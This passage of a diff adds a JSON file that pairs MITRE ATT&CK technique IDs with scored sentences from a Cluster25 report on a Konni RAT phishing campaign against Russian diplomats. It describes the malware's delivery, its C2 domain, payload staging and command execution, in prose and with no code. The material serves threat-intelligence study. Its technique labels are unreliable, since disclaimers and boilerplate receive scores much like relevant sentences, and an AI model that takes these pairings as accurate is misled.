+    "T1566",
+    "T1569"
+  ],
+  "Name_list": [
+    "Discovery",
+    "Execution",
+    "Exfiltration",
+    "Initial Access",
+    "Phishing",
+    "Screensaver",
+    "Source"
+  ],
+  "TTP_sentences": {
+    "T1020": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.3314
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.4521
+      },
+      {
+        "sentence": "02 INITIAL ACCESS C25 has traced an activity that started at least from August 2021 aimed at Russian targets operating in the diplomatic sector.",
+        "score": 0.3778
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.3459
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.3567
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.3967
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.3453
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.4834
+      },
+      {
+        "sentence": "The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.",
+        "score": 0.3683
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.4627
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.3201
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.5275
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.6563
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.3701
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.4512
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.3016
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.6108
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.3861
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.4007
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3683
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.3616
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3008
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.3772
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.3824
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.4894
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.4648
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.5708
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3636
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.4927
+      },
+      {
+        "sentence": "The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ---------------------------------------- Conversion note: Status: ok",
+        "score": 0.3532
+      }
+    ],
+    "T1059": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.459
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.4708
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.3696
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.4132
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.4807
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.5127
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.4622
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.4446
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.4574
+      },
+      {
+        "sentence": "The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.",
+        "score": 0.4568
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.5361
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.4571
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.5485
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.4488
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.4547
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.5142
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.531
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.3779
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.445
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.5765
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3554
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.4009
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3514
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.3608
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.4053
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.323
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.3541
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.3378
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.4111
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.3726
+      },
+      {
+        "sentence": "The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ---------------------------------------- Conversion note: Status: ok",
+        "score": 0.3675
+      }
+    ],
+    "T1071": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.3751
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.4468
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.3861
+      },
+      {
+        "sentence": "02 INITIAL ACCESS C25 has traced an activity that started at least from August 2021 aimed at Russian targets operating in the diplomatic sector.",
+        "score": 0.3743
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.3987
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.3702
+      },
+      {
+        "sentence": "The emails were spoofed using a *@mid.ru account as a sender to pretend that it was sent from the Russian Embassy in Serbia.",
+        "score": 0.3703
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.3363
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.3976
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.3497
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.6322
+      },
+      {
+        "sentence": "The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.",
+        "score": 0.5037
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.495
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.5176
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.5992
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.4482
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.5811
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.3294
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.4016
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3403
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.4929
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.4149
+      },
+      {
+        "sentence": "Visit us at cluster25.io IMPORTANT NOTICE: ©2021 Cluster25.",
+        "score": 0.3699
+      },
+      {
+        "sentence": "Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc.",
+        "score": 0.4315
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.3039
+      }
+    ],
+    "T1132": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.3816
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.4379
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.3867
+      },
+      {
+        "sentence": "02 INITIAL ACCESS C25 has traced an activity that started at least from August 2021 aimed at Russian targets operating in the diplomatic sector.",
+        "score": 0.3114
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.4126
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.4648
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.468
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.4728
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.4027
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.5949
+      },
+      {
+        "sentence": "The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.",
+        "score": 0.5688
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.517
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.4202
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3506
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.5249
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.5758
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.4161
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.5522
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.3894
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.4702
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.43
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3355
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.4376
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3625
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.3578
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.4285
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.3169
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.3915
+      },
+      {
+        "sentence": "Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc.",
+        "score": 0.3312
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.3952
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3391
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.387
+      },
+      {
+        "sentence": "The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ---------------------------------------- Conversion note: Status: ok",
+        "score": 0.3395
+      }
+    ],
+    "T1140": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.4362
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.376
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.5016
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.3725
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.5038
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.5466
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.4747
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.4446
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.3788
+      },
+      {
+        "sentence": "The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.",
+        "score": 0.4407
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.561
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.5328
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3184
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.4137
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.3756
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.3795
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.3845
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.3767
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.3474
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3471
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.4597
+      },
+      {
